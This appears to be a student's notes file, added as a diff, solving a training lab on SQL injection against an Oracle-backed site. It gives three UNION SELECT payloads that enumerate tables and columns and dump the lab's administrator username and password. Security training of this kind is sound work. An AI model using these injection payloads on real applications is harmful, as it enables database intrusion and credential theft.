@@ -1,0 +1,26 @@
+==> SQLi lab 6: getting the contents of oracle database
+==> goal: get the data stored in oracle data base from that find the table that stores username and passwords and get the administrator's
+credencials and log in to complete the lab
+
+tasks:
+1. how many columns query is using? : by seeing the site we can get that it has 2 columns
+2. what are the datatypes of those columns? : based on what site shows we know that both the column's datatype is text
+3. version of database?: to print the contents for this attack we don't need perfect version but as provided in our goal we know that its a oracle
+database and that's enough to refine our quries.
+4. we get the name of the table which contains the username and passwords
+5. based on the table we get we need to find column names where username and password is stored
+6. final step is find the admin's username and password and log in to the site
+
+> getting the name of the table which is containing usernames and passwords (user info)
+payload: ' UNION SELECT table_name,NULL FROM all_tables--
+output: we get all the tables from which we get this: USERS_GMMZXR
+
+> based on the table we find let's see all the columns in that table and if it contains username and password stored columns
+payload: ' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name = 'USERS_GMMZXR'--
+output: columns for username: USERNAME_QRZPNE , password: PASSWORD_SWJIQL
+
+> lets use these info and find out the administrator's username and password
+payload: ' UNION SELECT USERNAME_QRZPNE, PASSWORD_SWJIQL FROM USERS_GMMZXR--
+output: username: administrator , password: 095577c81hefc9oughie
+
+> now just log in using this credencials and done the lab is solved..
